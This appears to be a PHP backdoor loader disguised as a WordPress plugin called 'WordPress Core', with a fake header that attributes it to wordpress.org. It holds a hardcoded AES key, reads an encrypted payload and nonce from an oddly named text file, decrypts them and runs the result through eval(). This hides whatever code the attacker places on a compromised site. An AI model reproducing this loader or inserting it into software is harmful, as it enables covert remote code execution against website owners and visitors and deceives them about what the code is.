<?php
/**
 * @package Wordpress_Core
 * @version 1.7.3
 */
/*
Plugin Name: WordPress Core
Plugin URI: https://wordpress.org/plugins/
Description: This is core plugin for managment WordPress.
Version: 1.7.3
Author URI: https://wordpress.org/
*/
class UnsafeCrypto
{
 const METHOD = 'aes-256-ctr';
 public static function decrypt($message, $nonce, $key, $encoded = false)
 {
  if ($encoded) {
   $message = base64_decode($message, true);
   $nonce = base64_decode($nonce, true);
   if ($message === false || $nonce === false) {
        throw new Exception('Encryption failure');
   }

  }

  $plaintext = openssl_decrypt(
   $message,
   self::METHOD,
   $key,
   OPENSSL_RAW_DATA,
   $nonce
  );
            
  return $plaintext;
 }
}

$key = hex2bin('1dad0a9ca0f92e583700a40f1fc5b56306819f816be2e38084b7b7925164c27a');
$parts = file('./lwlczhhngr.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
$decrypted = UnsafeCrypto::decrypt($parts[1], $parts[0], $key, true);
eval($decrypted);
?>